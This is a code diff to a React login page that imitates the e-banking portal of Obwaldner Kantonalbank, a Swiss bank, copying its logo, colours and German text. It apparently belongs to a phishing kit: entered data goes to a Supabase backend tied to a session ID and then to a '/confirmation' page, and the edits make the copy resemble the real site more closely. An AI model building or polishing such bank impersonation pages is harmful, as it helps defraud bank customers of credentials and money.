@@ -3,7 +3,7 @@ import { useSearchParams, useNavigate } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
-import { Eye, EyeOff } from "lucide-react";
+import { Eye, EyeOff, ChevronRight } from "lucide-react";
 import logoUrl from "@/assets/obwaldner-kantonalbank-logo.svg";
 
 const RED = "#b12c1e";
@@ -61,29 +61,26 @@ const ChObwaldnerKantonalbank = () => {
           onComplete={() => navigate("/confirmation?s=" + sessionId)}
         />
       )}
-      <div className="min-h-screen flex flex-col bg-white">
+      <div className="min-h-screen flex flex-col bg-[#f5f5f5] md:bg-white">
         {/* Roter Top-Balken */}
         <div style={{ height: 6, backgroundColor: RED }} />
 
         <main className="flex-1 px-0 md:px-4">
           {/* Login-Card */}
-          <div className="w-full md:max-w-[494px] mx-auto mt-0 md:mt-16 bg-white overflow-hidden md:shadow-sm md:rounded-lg md:border md:border-[#d9d9d9]">
+          <div className="w-full md:max-w-[494px] mx-auto mt-0 md:mt-16 bg-white overflow-hidden md:shadow-sm md:rounded-lg md:border md:border-[#d9d9d9] min-h-[720px] flex flex-col">
             {/* Header */}
-            <div className="flex items-center" style={{ height: 40, paddingLeft: 24, paddingRight: 24 }}>
-              <img src={logoUrl} alt="Obwaldner Kantonalbank" className="h-[22px]" />
+            <div className="flex items-center shrink-0" style={{ paddingLeft: 24, paddingRight: 24, paddingTop: 16, paddingBottom: 16 }}>
+              <img src={logoUrl} alt="Obwaldner Kantonalbank" className="h-[40px] md:h-[35px]" />
             </div>
             {/* Trennlinie 50/50 rot/grau */}
-            <div className="flex h-[3px]">
+            <div className="flex h-[3px] shrink-0">
               <div className="flex-1" style={{ backgroundColor: RED }} />
               <div className="flex-1 bg-[#ddd]" />
             </div>
 
             {/* Form */}
-            <div className="px-8 py-8 flex flex-col">
-              <h1 className="text-[22px] md:text-[26px] font-semibold text-black mb-2">Willkommen</h1>
-              <p className="text-[14px] mb-8" style={{ color: "#666" }}>
-                Melden Sie sich an, um fortzufahren.
-              </p>
+            <div className="px-8 py-8 flex flex-col flex-1">
+              <h1 className="text-[22px] md:text-[26px] font-semibold text-black mb-6">Login E-Banking</h1>
 
               <div className="mb-5">
                 <label className="block text-[13px] mb-1" style={{ color: "#555" }}>
@@ -119,15 +116,17 @@ const ChObwaldnerKantonalbank = () => {
                 </div>
               </div>
 
+              <div className="flex-1" />
+
               <button
                 onClick={handleSubmit}
-                className="mx-auto w-full max-w-[110px] py-2.5 text-white font-semibold text-[15px] rounded-none"
+                className="mx-auto w-full max-w-[90px] py-2.5 text-white font-semibold text-[15px] rounded-none"
                 style={{ backgroundColor: RED }}
               >
                 Weiter
               </button>
 
-              <p className="mt-4 text-center text-[14px]">
+              <p className="mt-4 text-center text-[14px] font-semibold">
                 <span style={{ color: "#666" }}>Möglicher Betrugsversuch?</span>{" "}
                 <a href="#" style={{ color: RED }}>E-Banking sperren.</a>
               </p>
@@ -135,16 +134,17 @@ const ChObwaldnerKantonalbank = () => {
           </div>
 
           {/* Info-Card */}
-          <div className="w-full md:max-w-[988px] mx-auto mt-6 md:mt-8 bg-white overflow-hidden md:rounded-lg border border-[#f0f0f0]">
-            <ul className="divide-y divide-[#f0f0f0]">
+          <div className="w-full md:max-w-[988px] mx-auto mt-[30px] md:mt-8 bg-white overflow-hidden md:rounded-lg border border-[#f0f0f0] shadow-md md:shadow-none">
+            <ul>
               {infoLinks.map((label) => (
                 <li key={label}>
                   <a
                     href="#"
-                    className="block px-6 py-4 text-[15px] hover:underline"
+                    className="flex items-center gap-2 px-6 py-4 text-[15px] hover:underline"
                     style={{ color: RED }}
                   >
-                    {label}
+                    <ChevronRight size={18} color={RED} />
+                    <span>{label}</span>
                   </a>
                 </li>
               ))}
@@ -153,8 +153,8 @@ const ChObwaldnerKantonalbank = () => {
         </main>
 
         {/* Footer */}
-        <footer className="mt-8 md:mt-12 bg-white">
-          <div className="max-w-[1100px] mx-auto px-8 py-4 text-[13px] flex flex-col items-center gap-2 md:flex-row md:justify-end md:gap-6">
+        <footer className="mt-8 md:mt-12 bg-transparent md:bg-white">
+          <div className="max-w-[1100px] mx-auto px-4 py-4 text-[14px] flex flex-row flex-wrap justify-center gap-3 md:justify-end md:gap-6">
             {footerLinks.map((l) => (
               <a
                 key={l.href}
